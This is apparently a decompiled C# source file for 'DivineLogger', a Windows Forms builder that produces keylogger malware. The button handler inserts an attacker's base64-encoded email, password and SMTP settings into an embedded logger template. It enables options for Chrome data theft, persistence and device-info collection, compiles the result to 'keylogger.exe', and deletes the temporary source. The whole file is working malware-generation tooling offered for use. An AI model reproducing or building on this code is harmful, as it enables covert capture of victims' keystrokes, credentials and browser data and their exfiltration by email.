using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using DivineLogger.Properties;
using Microsoft.CSharp;

namespace DivineLogger
{
	// Token: 0x02000002 RID: 2
	public partial class DLogger : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public DLogger()
		{
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.FixedSingle;
			base.MaximizeBox = false;
			using (StreamWriter writetext = new StreamWriter(Path.GetTempPath() + "\\logger.cs"))
			{
				writetext.Write(Resources.Class1);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020B4 File Offset: 0x000002B4
		private void button1_Click(object sender, EventArgs e)
		{
			string email = this.textBox1.Text;
			string password = this.textBox2.Text;
			string smtp = this.textBox3.Text;
			string port = this.textBox4.Text;
			string text = Resources.Class1;
			text = text.Replace("myemail", Convert.ToBase64String(Encoding.UTF8.GetBytes(email)));
			text = text.Replace("mypassword", Convert.ToBase64String(Encoding.UTF8.GetBytes(password)));
			text = text.Replace("mysmtp", Convert.ToBase64String(Encoding.UTF8.GetBytes(smtp)));
			text = text.Replace("587", port);
			if (this.checkBox1.Checked)
			{
				text = text.Replace("SecureSocketsLayer", "true");
			}
			if (!this.checkBox1.Checked)
			{
				text = text.Replace("SecureSocketsLayer", "false");
			}
			if (this.checkBox5.Checked)
			{
				text = text.Replace("chrome_false", "chrome_true");
			}
			if (this.checkBox3.Checked)
			{
				text = text.Replace("persistence_false", "persistence_true");
			}
			if (this.checkBox2.Checked)
			{
				text = text.Replace("deviceinfo_false", "deviceinfo_true");
			}
			File.WriteAllText(Path.GetTempPath() + "\\logger.cs", text);
			string source = File.ReadAllText(Path.GetTempPath() + "\\logger.cs");
			string[] references = new string[]
			{
				"System.dll",
				"System.Core.dll",
				"System.Data.dll"
			};
			CompilerResults results = DLogger.CompileCsharpSource(new string[]
			{
				source
			}, "keylogger.exe", references);
			if (results.Errors.Count == 0)
			{
				MessageBox.Show("Sucess!");
			}
			else
			{
				foreach (object obj in results.Errors)
				{
					CompilerError error = (CompilerError)obj;
					Console.WriteLine(error.Line + error.ErrorText + error.ErrorNumber);
				}
				MessageBox.Show("Error!");
			}
			File.Delete(Path.GetTempPath() + "\\logger.cs");
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002314 File Offset: 0x00000514
		private static CompilerResults CompileCsharpSource(string[] sources, string output, params string[] references)
		{
			CompilerParameters parameters = new CompilerParameters(references, output);
			parameters.GenerateExecutable = true;
			CompilerResults result;
			using (CSharpCodeProvider provider = new CSharpCodeProvider())
			{
				result = provider.CompileAssemblyFromSource(parameters, sources);
			}
			return result;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000235C File Offset: 0x0000055C
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000235E File Offset: 0x0000055E
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002360 File Offset: 0x00000560
		private void checkBox5_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002362 File Offset: 0x00000562
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002364 File Offset: 0x00000564
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
		}
	}
}
